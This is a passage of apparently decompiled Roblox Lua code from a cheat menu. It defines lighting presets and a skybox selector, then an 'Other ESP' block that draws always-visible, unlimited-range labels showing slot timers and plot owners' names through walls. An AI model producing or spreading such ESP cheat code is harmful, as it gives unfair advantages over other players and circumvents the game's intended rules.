				tbl16[9] = {
					name = "Lens Flare Style",
					data = { SunRays = { Intensity = 0.1 }, Bloom = { Intensity = 2, Threshold = 0.9 } },
				}

				tbl16[10] = {
					name = "Sunset Rays",
					data = { Lighting = { ClockTime = 17.8 }, SunRays = { Intensity = 0.25 } },
				}

				tbl16[11] = { name = "High Exposure", data = { Lighting = { ExposureCompensation = 1.5 } } }

				local tbl19 = {
					Lighting = {},
					Atmosphere = {},
					Bloom = {},
					ColorCorrection = {},
					Blur = {},
					Depth = {},
					SunRays = {},
					Sky = {},
					Clouds = {},
				}

				local function fn20()
					pcall(function()
						tbl19.Lighting = {
							Ambient = Lighting.Ambient,
							ClockTime = Lighting.ClockTime,
							Brightness = Lighting.Brightness,
							ColorShift_Top = Lighting.ColorShift_Top,
							ColorShift_Bottom = Lighting.ColorShift_Bottom,
							EnvironmentDiffuseScale = Lighting.EnvironmentDiffuseScale,
							EnvironmentSpecularScale = Lighting.EnvironmentSpecularScale,
							GlobalShadows = Lighting.GlobalShadows,
							OutdoorAmbient = Lighting.OutdoorAmbient,
							ExposureCompensation = Lighting.ExposureCompensation,
							FogEnd = Lighting.FogEnd,
							FogStart = Lighting.FogStart,
							FogColor = Lighting.FogColor,
						}

						local atmosphere = Lighting:FindFirstChildWhichIsA("Atmosphere")

						if atmosphere then
							tbl19.Atmosphere = {
								Density = atmosphere.Density,
								Offset = atmosphere.Offset,
								Color = atmosphere.Color,
								Decay = atmosphere.Decay,
								Glare = atmosphere.Glare,
								Haze = atmosphere.Haze,
							}
						end

						local bloomEffect = Lighting:FindFirstChildWhichIsA("BloomEffect")

						if bloomEffect then
							tbl19.Bloom = { Intensity = bloomEffect.Intensity, Size = bloomEffect.Size, Threshold = bloomEffect.Threshold }
						end

						local colorCorrectionEffect = Lighting:FindFirstChildWhichIsA("ColorCorrectionEffect")

						if colorCorrectionEffect then
							tbl19.ColorCorrection = {
								Brightness = colorCorrectionEffect.Brightness,
								Contrast = colorCorrectionEffect.Contrast,
								Saturation = colorCorrectionEffect.Saturation,
								TintColor = colorCorrectionEffect.TintColor,
							}
						end

						local blurEffect = Lighting:FindFirstChildWhichIsA("BlurEffect")

						if blurEffect then
							tbl19.Blur = { Size = blurEffect.Size }
						end

						local depthOfFieldEffect = Lighting:FindFirstChildWhichIsA("DepthOfFieldEffect")

						if depthOfFieldEffect then
							tbl19.Depth = {
								FarIntensity = depthOfFieldEffect.FarIntensity,
								FocusDistance = depthOfFieldEffect.FocusDistance,
								InFocusRadius = depthOfFieldEffect.InFocusRadius,
								NearIntensity = depthOfFieldEffect.NearIntensity,
							}
						end

						local sunRaysEffect = Lighting:FindFirstChildWhichIsA("SunRaysEffect")

						if sunRaysEffect then
							tbl19.SunRays = { Intensity = sunRaysEffect.Intensity, Spread = sunRaysEffect.Spread }
						end

						local sky = Lighting:FindFirstChildWhichIsA("Sky")

						if sky then
							tbl19.Sky = {
								SkyboxBk = sky.SkyboxBk,
								SkyboxDn = sky.SkyboxDn,
								SkyboxFt = sky.SkyboxFt,
								SkyboxLf = sky.SkyboxLf,
								SkyboxRt = sky.SkyboxRt,
								SkyboxUp = sky.SkyboxUp,
							}
						end

						local clouds = workspace.Terrain:FindFirstChildWhichIsA("Clouds")

						if clouds then
							tbl19.Clouds = { Cover = clouds.Cover, Density = clouds.Density, Color = clouds.Color }
						end
					end)
				end

				fn20()

				local function fn21()
					pcall(function()
						local lighting = tbl19.Lighting

						if lighting then
							Lighting.Ambient = lighting.Ambient
							Lighting.ClockTime = lighting.ClockTime
							Lighting.Brightness = lighting.Brightness
							Lighting.ColorShift_Top = lighting.ColorShift_Top
							Lighting.ColorShift_Bottom = lighting.ColorShift_Bottom
							Lighting.EnvironmentDiffuseScale = lighting.EnvironmentDiffuseScale
							Lighting.EnvironmentSpecularScale = lighting.EnvironmentSpecularScale
							Lighting.GlobalShadows = lighting.GlobalShadows
							Lighting.OutdoorAmbient = lighting.OutdoorAmbient
							Lighting.ExposureCompensation = lighting.ExposureCompensation
							Lighting.FogEnd = lighting.FogEnd
							Lighting.FogStart = lighting.FogStart
							Lighting.FogColor = lighting.FogColor
						end

						local atmosphere = Lighting:FindFirstChildWhichIsA("Atmosphere")

						if atmosphere and tbl19.Atmosphere then
							for k, v18 in pairs(tbl19.Atmosphere) do
								pcall(function()
									atmosphere[k] = v18
								end)
							end
						end

						local bloomEffect = Lighting:FindFirstChildWhichIsA("BloomEffect")

						if bloomEffect and tbl19.Bloom then
							for k, v18 in pairs(tbl19.Bloom) do
								pcall(function()
									bloomEffect[k] = v18
								end)
							end
						end

						local colorCorrectionEffect = Lighting:FindFirstChildWhichIsA("ColorCorrectionEffect")

						if colorCorrectionEffect and tbl19.ColorCorrection then
							for k, v18 in pairs(tbl19.ColorCorrection) do
								pcall(function()
									colorCorrectionEffect[k] = v18
								end)
							end
						end

						local blurEffect = Lighting:FindFirstChildWhichIsA("BlurEffect")

						if blurEffect and tbl19.Blur then
							for k, v18 in pairs(tbl19.Blur) do
								pcall(function()
									blurEffect[k] = v18
								end)
							end
						end

						local depthOfFieldEffect = Lighting:FindFirstChildWhichIsA("DepthOfFieldEffect")

						if depthOfFieldEffect and tbl19.Depth then
							for k, v18 in pairs(tbl19.Depth) do
								pcall(function()
									depthOfFieldEffect[k] = v18
								end)
							end
						end

						local sunRaysEffect = Lighting:FindFirstChildWhichIsA("SunRaysEffect")

						if sunRaysEffect and tbl19.SunRays then
							for k, sunRay in pairs(tbl19.SunRays) do
								pcall(function()
									sunRaysEffect[k] = sunRay
								end)
							end
						end

						local sky = Lighting:FindFirstChildWhichIsA("Sky")

						if sky and tbl19.Sky then
							for k, v18 in pairs(tbl19.Sky) do
								pcall(function()
									sky[k] = v18
								end)
							end
						end

						local clouds = workspace.Terrain:FindFirstChildWhichIsA("Clouds")

						if clouds and tbl19.Clouds then
							for k, cloud in pairs(tbl19.Clouds) do
								pcall(function()
									clouds[k] = cloud
								end)
							end
						end
					end)
				end

				local function fn22(arg)
					if not arg then
						return
					end
					fn21()

					if arg.Lighting then
						for k, v18 in pairs(arg.Lighting) do
							pcall(function()
								Lighting[k] = v18
							end)
						end
					end

					local atmosphere = Lighting:FindFirstChildWhichIsA("Atmosphere")

					if arg.Atmosphere and atmosphere then
						for k, v18 in pairs(arg.Atmosphere) do
							pcall(function()
								atmosphere[k] = v18
							end)
						end
					end

					local bloomEffect = Lighting:FindFirstChildWhichIsA("BloomEffect")

					if arg.Bloom and bloomEffect then
						for k, v18 in pairs(arg.Bloom) do
							pcall(function()
								bloomEffect[k] = v18
							end)
						end
					end

					local colorCorrectionEffect = Lighting:FindFirstChildWhichIsA("ColorCorrectionEffect")

					if arg.ColorCorrection and colorCorrectionEffect then
						for k, v18 in pairs(arg.ColorCorrection) do
							pcall(function()
								colorCorrectionEffect[k] = v18
							end)
						end
					end

					local blurEffect = Lighting:FindFirstChildWhichIsA("BlurEffect")

					if arg.Blur and blurEffect then
						for k, v18 in pairs(arg.Blur) do
							pcall(function()
								blurEffect[k] = v18
							end)
						end
					end

					local depthOfFieldEffect = Lighting:FindFirstChildWhichIsA("DepthOfFieldEffect")

					if arg.Depth and depthOfFieldEffect then
						for k, v18 in pairs(arg.Depth) do
							pcall(function()
								depthOfFieldEffect[k] = v18
							end)
						end
					end

					local sunRaysEffect = Lighting:FindFirstChildWhichIsA("SunRaysEffect")

					if arg.SunRays and sunRaysEffect then
						for k, sunRay in pairs(arg.SunRays) do
							pcall(function()
								sunRaysEffect[k] = sunRay
							end)
						end
					end

					local sky = Lighting:FindFirstChildWhichIsA("Sky")

					if arg.Sky and sky then
						for k, v18 in pairs(arg.Sky) do
							pcall(function()
								sky[k] = v18
							end)
						end
					end

					local clouds = workspace.Terrain:FindFirstChildWhichIsA("Clouds")

					if arg.Clouds and clouds then
						for k, cloud in pairs(arg.Clouds) do
							pcall(function()
								clouds[k] = cloud
							end)
						end
					end
				end

				local function fn23()
					for _, child in pairs(Lighting:GetChildren()) do
						if child:IsA("SunRaysEffect") or child:IsA("BloomEffect") or child:IsA("ColorCorrectionEffect") or child:IsA("Atmosphere") then
							child:Destroy()
						end
					end

					Lighting.GlobalShadows = true
					Lighting.OutdoorAmbient = tbl19.Lighting.OutdoorAmbient or Color3.fromRGB(127, 127, 127)
					Lighting.Brightness = tbl19.Lighting.Brightness or 2
					Lighting.ExposureCompensation = tbl19.Lighting.ExposureCompensation or 0
					Lighting.ClockTime = tbl19.Lighting.ClockTime or 14
				end

				local function fn24(arg)
					if not arg or not arg.data then
						return
					end
					fn23()

					if arg.data.Lighting then
						for k, v18 in pairs(arg.data.Lighting) do
							pcall(function()
								Lighting[k] = v18
							end)
						end
					end

					if arg.data.Bloom then
						local bloomEffect = Instance.new("BloomEffect")
						bloomEffect.Parent = Lighting

						for k, v18 in pairs(arg.data.Bloom) do
							pcall(function()
								bloomEffect[k] = v18
							end)
						end
					end

					if arg.data.ColorCorrection then
						local colorCorrectionEffect = Instance.new("ColorCorrectionEffect")
						colorCorrectionEffect.Parent = Lighting

						for k, v18 in pairs(arg.data.ColorCorrection) do
							pcall(function()
								colorCorrectionEffect[k] = v18
							end)
						end
					end

					if arg.data.SunRays then
						local sunRaysEffect = Instance.new("SunRaysEffect")
						sunRaysEffect.Parent = Lighting

						for k, sunRay in pairs(arg.data.SunRays) do
							pcall(function()
								sunRaysEffect[k] = sunRay
							end)
						end
					end

					if arg.data.Atmosphere then
						local atmosphere = Instance.new("Atmosphere")
						atmosphere.Parent = Lighting

						for k, v18 in pairs(arg.data.Atmosphere) do
							pcall(function()
								atmosphere[k] = v18
							end)
						end
					end
				end

				local n26 = #tbl15
				local n27 = 0
				local flag11 = false
				local n28 = 0
				local flag12 = false
				local n29 = 0
				local n30 = 0

				v17:CreateToggle({
					Name = "Shaders Enabled",
					Default = false,
					Callback = function(arg)
						flag11 = arg

						if not arg then
							fn21()
							n28 = 0
						elseif n27 >= 1 and n27 <= n26 then
							fn22(tbl15[n27].data)
							n28 = n27
						end
					end,
				})

				v17:CreateSlider({
					Name = "Shader Selector (0 = off)",
					Min = 0,
					Max = n26,
					Default = 0,
					Flag = "ShaderSelector",
					Callback = function(arg)
						local n31 = math.floor(arg + 0.5)

						if n31 < 0 then
							n31 = 0
						elseif n26 < n31 then
							n31 = n26
						end

						n27 = n31
						if not flag11 then
							return
						end

						if n31 == 0 then
							fn21()
							n28 = 0
						elseif n31 ~= n28 then
							fn22(tbl15[n31].data)
							n28 = n31
						end
					end,
				})

				v17:CreateToggle({
					Name = "Shadows & Rays Enabled",
					Default = false,
					Callback = function(arg)
						flag12 = arg

						if not arg then
							fn23()
							n30 = 0
						elseif n29 >= 1 and n29 <= #tbl16 then
							fn24(tbl16[n29])
							n30 = n29
						end
					end,
				})

				v17:CreateSlider({
					Name = "Shadows & Rays Preset (0 = off)",
					Min = 0,
					Max = #tbl16,
					Default = 0,
					Flag = "ShadowRayPreset",
					Callback = function(arg)
						local n31 = math.floor(arg + 0.5)

						if n31 < 0 then
							n31 = 0
						elseif #tbl16 < n31 then
							n31 = #tbl16
						end

						n29 = n31
						if not flag12 then
							return
						end

						if n31 == 0 then
							fn23()
							n30 = 0
						elseif n31 ~= n30 then
							fn24(tbl16[n31])
							n30 = n31
						end
					end,
				})
			end

			do
				local tbl16 = {
					["Black Storm"] = {
						Bk = "rbxassetid://15502511288",
						Dn = "rbxassetid://15502508460",
						Ft = "rbxassetid://15502510289",
						Lf = "rbxassetid://15502507918",
						Rt = "rbxassetid://15502509398",
						Up = "rbxassetid://15502511911",
					},
					HD = {
						Bk = "http://www.roblox.com/asset/?id=16553658937",
						Dn = "http://www.roblox.com/asset/?id=16553660713",
						Ft = "http://www.roblox.com/asset/?id=16553662144",
						Lf = "http://www.roblox.com/asset/?id=16553664042",
						Rt = "http://www.roblox.com/asset/?id=16553665766",
						Up = "http://www.roblox.com/asset/?id=16553667750",
					},
					Snow = {
						Bk = "http://www.roblox.com/asset/?id=155657655",
						Dn = "http://www.roblox.com/asset/?id=155674246",
						Ft = "http://www.roblox.com/asset/?id=155657609",
						Lf = "http://www.roblox.com/asset/?id=155657671",
						Rt = "http://www.roblox.com/asset/?id=155657619",
						Up = "http://www.roblox.com/asset/?id=155674931",
					},
					["Blue Space"] = {
						Bk = "rbxassetid://15536110634",
						Dn = "rbxassetid://15536112543",
						Ft = "rbxassetid://15536116141",
						Lf = "rbxassetid://15536114370",
						Rt = "rbxassetid://15536118762",
						Up = "rbxassetid://15536117282",
					},
					Realistic = {
						Bk = "rbxassetid://653719502",
						Dn = "rbxassetid://653718790",
						Ft = "rbxassetid://653719067",
						Lf = "rbxassetid://653719190",
						Rt = "rbxassetid://653718931",
						Up = "rbxassetid://653719321",
					},
					Stormy = {
						Bk = "http://www.roblox.com/asset/?id=18703245834",
						Dn = "http://www.roblox.com/asset/?id=18703243349",
						Ft = "http://www.roblox.com/asset/?id=18703240532",
						Lf = "http://www.roblox.com/asset/?id=18703237556",
						Rt = "http://www.roblox.com/asset/?id=18703235430",
						Up = "http://www.roblox.com/asset/?id=18703232671",
					},
					Pink = {
						Bk = "rbxassetid://12216109205",
						Dn = "rbxassetid://12216109875",
						Ft = "rbxassetid://12216109489",
						Lf = "rbxassetid://12216110170",
						Rt = "rbxassetid://12216110471",
						Up = "rbxassetid://12216108877",
					},
					Sunset = {
						Bk = "rbxassetid://600830446",
						Dn = "rbxassetid://600831635",
						Ft = "rbxassetid://600832720",
						Lf = "rbxassetid://600886090",
						Rt = "rbxassetid://600833862",
						Up = "rbxassetid://600835177",
					},
					Arctic = {
						Bk = "http://www.roblox.com/asset/?id=225469390",
						Dn = "http://www.roblox.com/asset/?id=225469395",
						Ft = "http://www.roblox.com/asset/?id=225469403",
						Lf = "http://www.roblox.com/asset/?id=225469450",
						Rt = "http://www.roblox.com/asset/?id=225469471",
						Up = "http://www.roblox.com/asset/?id=225469481",
					},
					Space = {
						Bk = "http://www.roblox.com/asset/?id=166509999",
						Dn = "http://www.roblox.com/asset/?id=166510057",
						Ft = "http://www.roblox.com/asset/?id=166510116",
						Lf = "http://www.roblox.com/asset/?id=166510092",
						Rt = "http://www.roblox.com/asset/?id=166510131",
						Up = "http://www.roblox.com/asset/?id=166510114",
					},
					["Roblox Default"] = {
						Bk = "rbxasset://textures/sky/sky512_bk.tex",
						Dn = "rbxasset://textures/sky/sky512_dn.tex",
						Ft = "rbxasset://textures/sky/sky512_ft.tex",
						Lf = "rbxasset://textures/sky/sky512_lf.tex",
						Rt = "rbxasset://textures/sky/sky512_rt.tex",
						Up = "rbxasset://textures/sky/sky512_up.tex",
					},
					["Red Night"] = {
						Bk = "http://www.roblox.com/asset/?id=401664839",
						Dn = "http://www.roblox.com/asset/?id=401664862",
						Ft = "http://www.roblox.com/asset/?id=401664960",
						Lf = "http://www.roblox.com/asset/?id=401664881",
						Rt = "http://www.roblox.com/asset/?id=401664901",
						Up = "http://www.roblox.com/asset/?id=401664936",
					},
					["Deep Space 1"] = {
						Bk = "http://www.roblox.com/asset/?id=149397692",
						Dn = "http://www.roblox.com/asset/?id=149397686",
						Ft = "http://www.roblox.com/asset/?id=149397697",
						Lf = "http://www.roblox.com/asset/?id=149397684",
						Rt = "http://www.roblox.com/asset/?id=149397688",
						Up = "http://www.roblox.com/asset/?id=149397702",
					},
					["Pink Skies"] = {
						Bk = "http://www.roblox.com/asset/?id=151165214",
						Dn = "http://www.roblox.com/asset/?id=151165197",
						Ft = "http://www.roblox.com/asset/?id=151165224",
						Lf = "http://www.roblox.com/asset/?id=151165191",
						Rt = "http://www.roblox.com/asset/?id=151165206",
						Up = "http://www.roblox.com/asset/?id=151165227",
					},
					["Purple Sunset"] = {
						Bk = "rbxassetid://264908339",
						Dn = "rbxassetid://264907909",
						Ft = "rbxassetid://264909420",
						Lf = "rbxassetid://264909758",
						Rt = "rbxassetid://264908886",
						Up = "rbxassetid://264907379",
					},
					["Blue Night"] = {
						Bk = "http://www.roblox.com/asset/?id=12064107",
						Dn = "http://www.roblox.com/asset/?id=12064152",
						Ft = "http://www.roblox.com/asset/?id=12064121",
						Lf = "http://www.roblox.com/asset/?id=12063984",
						Rt = "http://www.roblox.com/asset/?id=12064115",
						Up = "http://www.roblox.com/asset/?id=12064131",
					},
					["Blossom Daylight"] = {
						Bk = "http://www.roblox.com/asset/?id=271042516",
						Dn = "http://www.roblox.com/asset/?id=271077243",
						Ft = "http://www.roblox.com/asset/?id=271042556",
						Lf = "http://www.roblox.com/asset/?id=271042310",
						Rt = "http://www.roblox.com/asset/?id=271042467",
						Up = "http://www.roblox.com/asset/?id=271077958",
					},
					["Blue Nebula"] = {
						Bk = "http://www.roblox.com/asset?id=135207744",
						Dn = "http://www.roblox.com/asset?id=135207662",
						Ft = "http://www.roblox.com/asset?id=135207770",
						Lf = "http://www.roblox.com/asset?id=135207615",
						Rt = "http://www.roblox.com/asset?id=135207695",
						Up = "http://www.roblox.com/asset?id=135207794",
					},
					["Blue Planet"] = {
						Bk = "rbxassetid://218955819",
						Dn = "rbxassetid://218953419",
						Ft = "rbxassetid://218954524",
						Lf = "rbxassetid://218958493",
						Rt = "rbxassetid://218957134",
						Up = "rbxassetid://218950090",
					},
					["Deep Space 2"] = {
						Bk = "http://www.roblox.com/asset/?id=159248188",
						Dn = "http://www.roblox.com/asset/?id=159248183",
						Ft = "http://www.roblox.com/asset/?id=159248187",
						Lf = "http://www.roblox.com/asset/?id=159248173",
						Rt = "http://www.roblox.com/asset/?id=159248192",
						Up = "http://www.roblox.com/asset/?id=159248176",
					},
					Summer = {
						Bk = "rbxassetid://16648590964",
						Dn = "rbxassetid://16648617436",
						Ft = "rbxassetid://16648595424",
						Lf = "rbxassetid://16648566370",
						Rt = "rbxassetid://16648577071",
						Up = "rbxassetid://16648598180",
					},
					Galaxy = {
						Bk = "rbxassetid://15983968922",
						Dn = "rbxassetid://15983966825",
						Ft = "rbxassetid://15983965025",
						Lf = "rbxassetid://15983967420",
						Rt = "rbxassetid://15983966246",
						Up = "rbxassetid://15983964246",
					},
					Stylized = {
						Bk = "rbxassetid://18351376859",
						Dn = "rbxassetid://18351374919",
						Ft = "rbxassetid://18351376800",
						Lf = "rbxassetid://18351376469",
						Rt = "rbxassetid://18351376457",
						Up = "rbxassetid://18351377189",
					},
					Minecraft = {
						Bk = "rbxassetid://8735166756",
						Dn = "http://www.roblox.com/asset/?id=8735166707",
						Ft = "http://www.roblox.com/asset/?id=8735231668",
						Lf = "http://www.roblox.com/asset/?id=8735166755",
						Rt = "http://www.roblox.com/asset/?id=8735166751",
						Up = "http://www.roblox.com/asset/?id=8735166729",
					},
					["Cloudy Rain"] = {
						Bk = "http://www.roblox.com/asset/?id=4498828382",
						Dn = "http://www.roblox.com/asset/?id=4498828812",
						Ft = "http://www.roblox.com/asset/?id=4498829917",
						Lf = "http://www.roblox.com/asset/?id=4498830911",
						Rt = "http://www.roblox.com/asset/?id=4498830417",
						Up = "http://www.roblox.com/asset/?id=4498831746",
					},
					["Black Cloudy Rain"] = {
						Bk = "http://www.roblox.com/asset/?id=149679669",
						Dn = "http://www.roblox.com/asset/?id=149681979",
						Ft = "http://www.roblox.com/asset/?id=149679690",
						Lf = "http://www.roblox.com/asset/?id=149679709",
						Rt = "http://www.roblox.com/asset/?id=149679722",
						Up = "http://www.roblox.com/asset/?id=149680199",
					},
				}

				local flag11 = false
				local str5 = "HD"
				local tbl17 = {}

				local function fn20()
					local sky = Lighting:FindFirstChildOfClass("Sky")

					if sky then
						tbl17.SkyboxBk = sky.SkyboxBk
						tbl17.SkyboxDn = sky.SkyboxDn
						tbl17.SkyboxFt = sky.SkyboxFt
						tbl17.SkyboxLf = sky.SkyboxLf
						tbl17.SkyboxRt = sky.SkyboxRt
						tbl17.SkyboxUp = sky.SkyboxUp
					end
				end

				fn20()

				local function fn21(arg)
					local v18 = tbl16[arg]
					if not v18 then
						return
					end
					local sky = Lighting:FindFirstChildOfClass("Sky") or Instance.new("Sky", Lighting)
					sky.Name = "Sky"
					sky.SkyboxBk = v18.Bk
					sky.SkyboxDn = v18.Dn
					sky.SkyboxFt = v18.Ft
					sky.SkyboxLf = v18.Lf
					sky.SkyboxRt = v18.Rt
					sky.SkyboxUp = v18.Up
				end

				local function fn22()
					local sky = Lighting:FindFirstChildOfClass("Sky")

					if sky and tbl17.SkyboxBk then
						sky.SkyboxBk = tbl17.SkyboxBk
						sky.SkyboxDn = tbl17.SkyboxDn
						sky.SkyboxFt = tbl17.SkyboxFt
						sky.SkyboxLf = tbl17.SkyboxLf
						sky.SkyboxRt = tbl17.SkyboxRt
						sky.SkyboxUp = tbl17.SkyboxUp
					elseif sky then
						sky:Destroy()
					end
				end

				local tbl18 = {}

				for k in pairs(tbl16) do
					table.insert(tbl18, k)
				end

				table.sort(tbl18)

				v17:CreateToggle({
					Name = "Custom Sky",
					Default = false,
					Flag = "CustomSky",
					Callback = function(arg)
						flag11 = arg

						if arg then
							fn21(str5)
						else
							fn22()
						end
					end,
				})

				v17:CreateDropdown({
					Name = "Skybox Selector",
					Items = tbl18,
					Default = "Blue Space",
					Flag = "SkyboxSelector",
					Callback = function(arg)
						str5 = arg

						if flag11 then
							fn21(arg)
						end
					end,
				})
			end

			do
				local v18 = _G.VisualTab:CreateBlock({ Name = "Other ESP", Side = "Left", ImageID = "7059346373" })
				local ws2 = _G.WS
				local repS = _G.RepS
				local flag11 = false
				local tbl16 = {}
				local tbl17 = {}
				local tbl18 = {}
				local tbl19 = {}
				local tbl20 = {}

				local function fn20(arg)
					if arg <= 0 then
						return "Ready!"
					end

					if arg < 60 then
						return math.ceil(arg) .. "s"
					end
					local n26 = math.floor(arg / 60)
					local n27 = math.floor(arg % 60)
					return string.format("%d:%02d", n26, n27)
				end

				local function fn21(adornee)
					if not adornee then
						return nil
					end
					local billboardGui = Instance.new("BillboardGui")
					billboardGui.Name = "SlotESP"
					billboardGui.Adornee = adornee
					billboardGui.Size = UDim2.new(0, 100, 0, 60)
					billboardGui.StudsOffset = Vector3.new(0, 2.5, 0)
					billboardGui.AlwaysOnTop = true
					billboardGui.MaxDistance = math.huge
					billboardGui.Parent = adornee
					local frame2 = Instance.new("Frame")
					frame2.Size = UDim2.new(1, 0, 1, 0)
					frame2.BackgroundTransparency = 1
					frame2.Parent = billboardGui
					local textLabel = Instance.new("TextLabel")
					textLabel.Name = "StatusText"
					textLabel.Size = UDim2.new(1, 0, 0, 20)
					textLabel.Position = UDim2.new(0, 0, 0, 0)
					textLabel.BackgroundTransparency = 1
					textLabel.Text = "0s"
					textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
					textLabel.TextStrokeTransparency = 0
					textLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
					textLabel.Font = Enum.Font.GothamBold
					textLabel.TextSize = 14
					textLabel.TextXAlignment = Enum.TextXAlignment.Center
					textLabel.Parent = frame2
					local imageLabel = Instance.new("ImageLabel")
					imageLabel.Size = UDim2.new(0, 35, 0, 35)
					imageLabel.Position = UDim2.new(0.5, -17.5, 0, 22)
					imageLabel.BackgroundTransparency = 1
					imageLabel.Image = "rbxassetid://93605122893571"
					imageLabel.Parent = frame2
					return { Billboard = billboardGui, Frame = frame2, Text = textLabel, Image = imageLabel, Handle = adornee }
				end

				local function fn22(arg)
					if tbl16[arg] then
						return
					end
					local slotHandle = arg:FindFirstChild("SlotHandle")
					if not slotHandle then
						return
					end
					local handle = slotHandle:FindFirstChild("Handle")
					if not handle then
						return
					end
					local v19 = fn21(handle)
					tbl18[arg] = v19
					tbl16[arg] = { Slot = arg, Handle = slotHandle, HandlePart = handle, Billboard = v19, TimeLeft = 0, IsReady = false }

					if tbl18[arg] and tbl18[arg].Billboard then
						tbl18[arg].Billboard.Enabled = false
					end
				end

				local function fn23(arg)
					if tbl18[arg] then
						if tbl18[arg].Billboard then
							tbl18[arg].Billboard:Destroy()
						end

						tbl18[arg] = nil
					end

					tbl16[arg] = nil
					tbl19[arg] = nil
					tbl20[arg] = nil
				end

				local function fn24()
					for k in pairs(tbl18) do
						fn23(k)
					end

					for _, v19 in pairs(tbl17) do
						pcall(function()
							v19:Disconnect()
						end)
					end

					tbl16 = {}
					tbl18 = {}
					tbl17 = {}
					tbl19 = {}
					tbl20 = {}
				end

				local function fn25()
					if not flag11 then
						return
					end
					fn24()
					local slots = ws2:FindFirstChild("Slots")
					if not slots then
						return
					end

					for _, child in pairs(slots:GetChildren()) do
						if child:IsA("Model") then
							fn22(child)
						end
					end

					local connection = slots.ChildAdded:Connect(function(child)
						task.wait(0.1)

						if child:IsA("Model") then
							fn22(child)
						end
					end)

					table.insert(tbl17, connection)

					local connection2 = slots.ChildRemoved:Connect(function(child)
						fn23(child)
					end)

					table.insert(tbl17, connection2)
					local slotEvents = repS:FindFirstChild("SlotEvents")

					if slotEvents then
						local slotTime = slotEvents:FindFirstChild("SlotTime")

						if slotTime and slotTime:IsA("RemoteEvent") then
							local connection3 = slotTime.OnClientEvent:Connect(function(arg)
								local slots2 = ws2:FindFirstChild("Slots")
								if not slots2 then
									return
								end

								for _, child in pairs(slots2:GetChildren()) do
									if child:IsA("Model") then
										if not tbl18[child] then
											fn22(child)
										end

										tbl19[child] = arg
										local flag12 = arg <= 0
										tbl20[child] = flag12

										if tbl18[child] and tbl18[child].Billboard then
											tbl18[child].Billboard.Enabled = true
											tbl18[child].Text.Text = fn20(arg)

											if flag12 then
												tbl18[child].Text.TextColor3 = Color3.fromRGB(0, 255, 0)
											else
												tbl18[child].Text.TextColor3 = Color3.fromRGB(255, 255, 255)
											end
										end
									end
								end
							end)

							table.insert(tbl17, connection3)
						end
					end
				end

				local function createBillboardGui2(adornee, text)
					if not adornee or not text then
						return nil
					end
					local billboardGui = Instance.new("BillboardGui")
					billboardGui.Name = "PlotOwnerESP"
					billboardGui.Adornee = adornee
					billboardGui.Size = UDim2.new(0, 200, 0, 50)
					billboardGui.StudsOffset = Vector3.new(0, 4, 0)
					billboardGui.AlwaysOnTop = true
					billboardGui.MaxDistance = math.huge
					billboardGui.Parent = adornee
					local frame2 = Instance.new("Frame")
					frame2.Size = UDim2.new(1, 0, 1, 0)
					frame2.BackgroundTransparency = 1
					frame2.Parent = billboardGui
					local imageLabel = Instance.new("ImageLabel")
					imageLabel.Size = UDim2.new(0, 30, 0, 30)
					imageLabel.Position = UDim2.new(0, 0, 0.5, -15)
					imageLabel.BackgroundTransparency = 1
					imageLabel.Image = "rbxassetid://112352744088491"
					imageLabel.Parent = frame2
					local textLabel = Instance.new("TextLabel")
					textLabel.Size = UDim2.new(0, 150, 0, 30)
					textLabel.Position = UDim2.new(0, 35, 0.5, -15)
					textLabel.BackgroundTransparency = 1
					textLabel.Text = text
					textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
					textLabel.TextStrokeTransparency = 0
					textLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
					textLabel.Font = Enum.Font.GothamBold
					textLabel.TextSize = 16
					textLabel.TextXAlignment = Enum.TextXAlignment.Left
					textLabel.Parent = frame2
					return billboardGui
				end

				local function fn26(arg)
					if not plotOwnerESPEnabled then
						return
					end

					if plotOwnerBillboards[arg] then
						plotOwnerBillboards[arg]:Destroy()
						plotOwnerBillboards[arg] = nil
					end

					local plotSign = arg:FindFirstChild("PlotSign")
					if not plotSign then
						return
					end
					local thisPlotsOwners = plotSign:FindFirstChild("ThisPlotsOwners")
					if not thisPlotsOwners then
						return
					end
					local value = nil

					for _, child in pairs(thisPlotsOwners:GetChildren()) do
						if child:IsA("StringValue") and child.Value ~= "" then
							value = child.Value
							break
						else
							value = nil
						end
					end

					if value then
						plotOwnerBillboards[arg] = createBillboardGui2(plotSign, value)
					end
				end

				local function fn27()
					if not plotOwnerESPEnabled then
						return
					end

					for _, v19 in pairs(plotOwnerBillboards) do
						if v19 and v19.Parent then
							v19:Destroy()
						end
					end

					plotOwnerBillboards = {}

					for _, v19 in pairs(plotOwnerConnections) do
						pcall(function()
							v19:Disconnect()
						end)
					end

					plotOwnerConnections = {}
					local plots = ws2:FindFirstChild("Plots")
					if not plots then
						return
					end

					for _, child in pairs(plots:GetChildren()) do
						if child:IsA("Model") and child.Name:find("Plot") then
							fn26(child)
						end
					end

					local connection = plots.ChildAdded:Connect(function(child)
						task.wait(0.5)

						if child:IsA("Model") and child.Name:find("Plot") then
							fn26(child)
						end
					end)

					table.insert(plotOwnerConnections, connection)

					local function fn28(arg)
						local plotSign = arg:FindFirstChild("PlotSign")
						if not plotSign then
							return
						end
						local thisPlotsOwners = plotSign:FindFirstChild("ThisPlotsOwners")
						if not thisPlotsOwners then
							return
						end

						local connection2 = thisPlotsOwners.ChildAdded:Connect(function()
							fn26(arg)
						end)

						table.insert(plotOwnerConnections, connection2)

						local connection3 = thisPlotsOwners.ChildRemoved:Connect(function()
							fn26(arg)
						end)

						table.insert(plotOwnerConnections, connection3)
					end

					for _, child in pairs(plots:GetChildren()) do
						if child:IsA("Model") and child.Name:find("Plot") then
							fn28(child)
						end
					end

					local connection2 = plots.ChildAdded:Connect(function(child)
						task.wait(0.3)

						if child:IsA("Model") and child.Name:find("Plot") then
							fn28(child)
						end
					end)

					table.insert(plotOwnerConnections, connection2)
					local plotEvents = repS:FindFirstChild("PlotEvents")

					if plotEvents then
						local plotOwnershipChanged = plotEvents:FindFirstChild("PlotOwnershipChanged")

						if plotOwnershipChanged and plotOwnershipChanged:IsA("RemoteEvent") then
							local connection3 = plotOwnershipChanged.OnClientEvent:Connect(function(arg)
								task.wait(0.2)
								fn26(arg)
							end)

							table.insert(plotOwnerConnections, connection3)
						end
					end
				end

				local function fn28()
					plotOwnerESPEnabled = false

					for _, v19 in pairs(plotOwnerBillboards) do
